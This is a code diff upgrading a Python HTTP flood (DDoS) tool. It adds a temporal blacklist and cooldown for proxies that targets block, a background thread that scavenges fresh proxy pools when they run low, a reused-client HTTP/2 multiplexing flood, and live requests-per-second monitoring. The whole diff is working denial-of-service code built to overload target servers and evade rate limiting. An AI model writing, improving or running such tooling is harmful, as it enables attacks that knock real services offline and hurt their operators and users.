@@ -57,14 +57,15 @@ logger.setLevel("INFO")
 ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
-# Enforce only TLSv1.2+ (defense-in-depth: also disable older protocols explicitly)
+# Enforce only TLSv1.2+
 if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
     ctx.minimum_version = ssl.TLSVersion.TLSv1_2
-# Disable insecure TLS versions for additional safety
-if hasattr(ssl, "OP_NO_TLSv1"):
-    ctx.options |= ssl.OP_NO_TLSv1
-if hasattr(ssl, "OP_NO_TLSv1_1"):
-    ctx.options |= ssl.OP_NO_TLSv1_1
+else:
+    # Fallback for older Python versions
+    if hasattr(ssl, "OP_NO_TLSv1"):
+        ctx.options |= ssl.OP_NO_TLSv1
+    if hasattr(ssl, "OP_NO_TLSv1_1"):
+        ctx.options |= ssl.OP_NO_TLSv1_1
 # [OPTIMIZED] Browser-Like Ciphers (Chrome 120+)
 ctx.set_ciphers(
     "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
@@ -256,7 +257,10 @@ REQUESTS_SENT = Counter()
 BYTES_SEND = Counter()
 TOTAL_REQUESTS_SENT = Counter()
 CONNECTIONS_SENT = Counter()
-BURNED_PROXIES = set() # [PHASE 4] Blacklist for blocked proxies
+BURNED_PROXIES = {} # [PHASE 11] Temporal Blacklist: Proxy -> BurnTimestamp
+COOLING_PERIOD = 300 # [PHASE 11] 5 Minutes cooldown for blocked proxies
+RECYCLE_EVENT = Event()
+IS_RECYCLING = False
 
 
 class Tools:
@@ -1114,27 +1118,61 @@ class HttpFlood(Thread):
                 "\r\n").encode("utf-8")
 
     def open_connection(self, host=None) -> socket:
+        proxy = None
         if self._proxies:
-            # [OPTIMIZED] Smart Rotation + [PHASE 4] Blacklist Skip
+            # [PHASE 11] Temporal Blacklist Check
             if not hasattr(self, '_proxy_cycle'):
                 from itertools import cycle
                 self._proxy_cycle = cycle(self._proxies)
             
-            # Skip burned proxies (limit attempts to avoid infinite loop)
+            # Use a limited number of attempts to find a "cool" proxy
             for _ in range(len(self._proxies)):
+                p = next(self._proxy_cycle)
+                
+                # Check if proxy is in Cooling Period
+                burn_time = BURNED_PROXIES.get(p.proxy)
+                if burn_time:
+                    if time() - burn_time > COOLING_PERIOD:
+                        # Cooling period expired, remove from blacklist
+                        del BURNED_PROXIES[p.proxy]
+                    else:
+                        # Still cooling down, skip
+                        continue
+                
+                self._current_proxy = p.proxy
+                proxy = p
+                break
+            
+            # [PHASE 11] Emergency Fallback: If ALL proxies are cooling, wait a bit
+            if not proxy:
+                # [PHASE 11] Trigger background recycle if pool is exhausted
+                global RECYCLE_EVENT, IS_RECYCLING
+                if not IS_RECYCLING:
+                    RECYCLE_EVENT.set()
+                
+                # print("[DEBUG] Pool Exhausted: Waiting for Cooling Period...")
+                sleep(2)
+                # Just take the first one available after sleep to avoid 0 PPS
                 proxy = next(self._proxy_cycle)
-                if proxy.proxy not in BURNED_PROXIES:
-                    self._current_proxy = proxy.proxy # [PHASE 4] Track for blacklisting
-                    sock = proxy.open_socket(AF_INET, SOCK_STREAM)
-                    break
-            else:
-                # All proxies burned? Fallback to direct or just fail
-                sock = socket(AF_INET, SOCK_STREAM)
+                self._current_proxy = proxy.proxy
+            
+            # [PHASE 11] Aggressive Recycle: Trigger when 80% of pool is burned
+            elif len(BURNED_PROXIES) > len(self._proxies) * 0.8:
+                if not IS_RECYCLING:
+                    RECYCLE_EVENT.set()
+
+        sock = None
+        if proxy:
+            sock = proxy.open_socket(AF_INET, SOCK_STREAM)
         else:
             sock = socket(AF_INET, SOCK_STREAM)
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        sock.settimeout(3.0) # [PHASE 4] Faster timeout for heavy flooding
+        
+        # [PHASE 11] Adaptive Timeout (Higher for Public Proxies)
+        # Assuming proxy_ty might be available or we just use a safer default
+        sock.settimeout(5.0) 
+        
         sock.connect(host or self._raw_target)
 
         if self._target.scheme.lower() == "https":
@@ -1436,7 +1474,7 @@ class HttpFlood(Thread):
                             print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] DYN: Server Response")
                             if status_code in {"403", "429"}:
                                 if hasattr(self, '_current_proxy'):
-                                    BURNED_PROXIES.add(self._current_proxy)
+                                    BURNED_PROXIES[self._current_proxy] = time()
                                 raise Exception("Proxy Blocked")
                     except Exception as e:
                         if "Blocked" in str(e): raise e
@@ -1481,10 +1519,10 @@ class HttpFlood(Thread):
                             status_code = response_start.split(" ")[1]
                             print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] POST_DYN: Response")
                             if status_code in {"403", "429"}:
-                                # [PHASE 4] Blacklist the proxy
+                                # [PHASE 11] Temporary Blacklist Proxy
                                 try:
                                     if hasattr(self, '_current_proxy'):
-                                        BURNED_PROXIES.add(self._current_proxy)
+                                        BURNED_PROXIES[self._current_proxy] = time()
                                 except: pass
                                 raise Exception("Proxy Blocked")
                     except Exception as e:
@@ -1495,7 +1533,7 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def H2_FLOOD(self):
-        # [PHASE 5] HTTP/2 Multiplexing Flood (Peak Evolution)
+        # [PHASE 5 & 10] HTTP/2 Multiplexing Flood (Optimized Client)
         path = self.get_random_target_path()
         ua = randchoice(self._useragents)
         
@@ -1506,10 +1544,14 @@ class HttpFlood(Thread):
                 from itertools import cycle
                 self._proxy_cycle = cycle(self._proxies)
             p = next(self._proxy_cycle)
+            # [PHASE 11] Temporal Check
+            burn_time = BURNED_PROXIES.get(p.proxy)
+            if burn_time and time() - burn_time < COOLING_PERIOD:
+                return # Still cooling
+            
             # [PHASE 5] Smart Protocol Detection for httpx
             prefix = "socks5://" if p.type in {ProxyType.SOCKS5, ProxyType.SOCKS4} else "http://"
             proxy_url = f"{prefix}{p.proxy}"
-            if p.proxy in BURNED_PROXIES: return
 
         headers = {
             "User-Agent": ua,
@@ -1519,28 +1561,40 @@ class HttpFlood(Thread):
         }
 
         try:
-            with httpx.Client(
-                http2=True,
-                verify=False,
-                proxies=proxy_url,
-                headers=headers,
-                timeout=3.0
-            ) as client:
-                # HTTP/2 allows multiple concurrent requests on 1 connection
-                for _ in range(self._rpc * 5):
-                    resp = client.get(f"{self._target.scheme}://{self._target.authority}{path}")
-                    global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
+            # [PHASE 10] Reuse client if possible to prevent overhead
+            if not hasattr(self, '_h2_client') or self._h2_client.is_closed:
+                self._h2_client = httpx.Client(
+                    http2=True,
+                    verify=False,
+                    proxies=proxy_url,
+                    headers=headers,
+                    timeout=5.0 # Increased timeout for slow proxies
+                )
+            
+            client = self._h2_client
+            # HTTP/2 allows multiple concurrent requests on 1 connection
+            # We use a smaller internal loop to report back more frequently
+            for _ in range(5): 
+                with client.stream("GET", f"{self._target.scheme}://{self._target.authority}{path}") as resp:
+                    global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND, TOTAL_REQUESTS_SENT
                     CONNECTIONS_SENT += 1
                     REQUESTS_SENT += 1
-                    BYTES_SEND += len(resp.content) + 500 # Approx headers size
+                    TOTAL_REQUESTS_SENT += 1
+                    # Track data sent/received
+                    BYTES_SEND += 1000 # Approx headers + partial body
+                    
                     if resp.status_code % 100 == 5:
                         print(f"[{int(CONNECTIONS_SENT)}] [STATUS {resp.status_code}] H2_FLOOD: Target Overloaded!")
                     elif resp.status_code in {403, 429}:
                         if proxy_url:
-                            BURNED_PROXIES.add(p.proxy)
+                            BURNED_PROXIES[p.proxy] = time()
                         raise Exception("Proxy Blocked")
-        except:
-            pass
+        except Exception:
+            # If client fails, close it so it recreates next time
+            if hasattr(self, '_h2_client'):
+                try: self._h2_client.close()
+                except: pass
+                self._h2_client = None
 
     def DOWNLOADER(self):
         payload: Any = self.generate_payload()
@@ -1828,7 +1882,7 @@ class HttpFlood(Thread):
                             status_code = response_start.split(" ")[1]
                             if status_code in {"403", "429"}:
                                 if hasattr(self, '_current_proxy'):
-                                    BURNED_PROXIES.add(self._current_proxy)
+                                    BURNED_PROXIES[self._current_proxy] = time()
                                 raise Exception("Proxy Blocked")
                     except Exception as e:
                         if "Blocked" in str(e): raise e
@@ -1889,7 +1943,7 @@ class HttpFlood(Thread):
                         if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
                             if response_start.split(" ")[1] in {"403", "429"}:
                                 if hasattr(self, '_current_proxy'):
-                                    BURNED_PROXIES.add(self._current_proxy)
+                                    BURNED_PROXIES[self._current_proxy] = time()
                                 break
                     except: pass
         except:
@@ -2241,7 +2295,7 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
             logger.info(f"{bcolors.OKCYAN}MEGA-SCAVENGE: Found {len(proxies):,} potential IPs. Filtering for Live ones...{bcolors.RESET}")
             # [UPGRADED] Real-time Target Latency Check
             proxies = list(ProxyChecker.checkAll(
-                set(proxies), timeout=2, threads=min(1000, len(proxies)),
+                set(proxies), timeout=5, threads=min(1000, len(proxies)),
                 url=url.human_repr() if url else "http://www.google.id"
             ))
             logger.info(f"{bcolors.OKGREEN}Armageddon Results: {len(proxies):,} Live Indonesian Proxies ready for deployment.{bcolors.RESET}")
@@ -2251,7 +2305,7 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
         if proxies:
             logger.info(f"{bcolors.OKCYAN}Found {len(proxies):,} Indo Proxies. Checking for Live ones...{bcolors.RESET}")
             proxies = list(ProxyChecker.checkAll(
-                set(proxies), timeout=2, threads=min(1000, len(proxies)),
+                set(proxies), timeout=5, threads=min(1000, len(proxies)),
                 url=url.human_repr() if url else "http://www.google.com"
             ))
             logger.info(f"{bcolors.OKGREEN}Indo-Scavenger Success! {len(proxies):,} Live local proxies found.{bcolors.RESET}")
@@ -2354,7 +2408,7 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
             logger.info(f"{bcolors.OKCYAN}Scavenged {len(proxies):,} proxies. Now Checking for Live ones... (This takes time){bcolors.RESET}")
             # [OPTIMIZED] Verify Scavenged Proxies
             proxies = list(ProxyChecker.checkAll(
-                set(proxies), timeout=2, threads=min(1000, len(proxies)),
+                set(proxies), timeout=5, threads=min(1000, len(proxies)),
                 url="http://www.google.com" # Check against a reliable target
             ))
             logger.info(f"{bcolors.OKGREEN}Scavenged & Verified {len(proxies):,} Live Proxies!{bcolors.RESET}")
@@ -2363,6 +2417,32 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
             proxies = None
 
     return proxies
+
+
+def proxy_recycler(proxies_list, con, proxy_li, proxy_ty, url=None):
+    global IS_RECYCLING, RECYCLE_EVENT
+    while True:
+        RECYCLE_EVENT.wait()
+        IS_RECYCLING = True
+        logger.info(f"{bcolors.WARNING}Proxy Pool Exhausted or Health Low! RECYCLING Fresh IPs...{bcolors.RESET}")
+        
+        try:
+            # Re-run scavenger
+            new_proxies = handleProxyList(con, proxy_li, proxy_ty, url)
+            if new_proxies:
+                # Atomically update the shared list content
+                global BURNED_PROXIES
+                BURNED_PROXIES.clear()
+                
+                # Update the shared list
+                proxies_list[:] = list(set(proxies_list + new_proxies))
+                logger.info(f"{bcolors.OKGREEN}Recycle Success: Pool now has {len(proxies_list):,} total IPs.{bcolors.RESET}")
+        except Exception as e:
+            logger.error(f"Recycle Error: {e}")
+        
+        IS_RECYCLING = False
+        RECYCLE_EVENT.clear()
+        sleep(60) # Prevent rapid fire recycling
 
 
 if __name__ == '__main__':
@@ -2474,6 +2554,9 @@ if __name__ == '__main__':
                    logger.warning(f"{bcolors.WARNING}Recon: No paths found or crawl blocked. Falling back to simple paths.{bcolors.RESET}")
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
+                if proxies:
+                    Thread(target=proxy_recycler, args=(proxies, con, proxy_li, proxy_ty, url), daemon=True).start()
+                
                 for thread_id in range(threads):
                     flood = HttpFlood(thread_id, url, host, method, rpc, event,
                                       uagents, referers, proxies)
@@ -2538,6 +2621,9 @@ if __name__ == '__main__':
                             if not proxy_li.exists():
                                 proxy_li = Path(__dir__ / "files/proxies" / user_path)
                             proxies = handleProxyList(con, proxy_li, proxy_ty)
+                            if proxies:
+                                Thread(target=proxy_recycler, args=(proxies, con, proxy_li, proxy_ty, None), daemon=True).start()
+                            
                             if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
                                 exit("this method cannot use for layer4 proxy")
 
@@ -2566,12 +2652,25 @@ if __name__ == '__main__':
                 % (target or url.host, method, timer, threads))
             event.set()
             ts = time()
+            last_requests = 0
+            last_bytes = 0
             while time() < ts + timer:
-                # [PHASE 2] Visual PPS & BPS Stats
+                # [PHASE 10] Non-Resetting Monitoring (Calculates Delta per second)
+                current_requests = int(REQUESTS_SENT)
+                current_bytes = int(BYTES_SEND)
+                
+                pps = current_requests - last_requests
+                bps = current_bytes - last_bytes
+                
+                # If counters were reset elsewhere (unlikely now) or wrapped
+                if pps < 0: pps = current_requests 
+                if bps < 0: bps = current_bytes
+
                 print(
-                    f'\r{bcolors.WARNING}Target:{bcolors.OKBLUE} {target or url.host}{bcolors.WARNING} | Speed:{bcolors.OKGREEN} {Tools.human_format(int(REQUESTS_SENT), "PPS")}{bcolors.WARNING} | Data:{bcolors.OKBLUE} {Tools.human_format(int(BYTES_SEND), "Bps")}{bcolors.WARNING} | Progress: {bcolors.OKCYAN}{round((time() - ts) / timer * 100, 2)}%{bcolors.RESET}', end="")
-                REQUESTS_SENT.set(0)
-                BYTES_SEND.set(0)
+                    f'\r{bcolors.WARNING}Target:{bcolors.OKBLUE} {target or url.host}{bcolors.WARNING} | Speed:{bcolors.OKGREEN} {Tools.human_format(pps, "PPS")}{bcolors.WARNING} | Data:{bcolors.OKBLUE} {Tools.human_format(bps, "Bps")}{bcolors.WARNING} | Progress: {bcolors.OKCYAN}{round((time() - ts) / timer * 100, 2)}%{bcolors.RESET}', end="")
+                
+                last_requests = current_requests
+                last_bytes = current_bytes
                 sleep(1)
             print("\n")
 
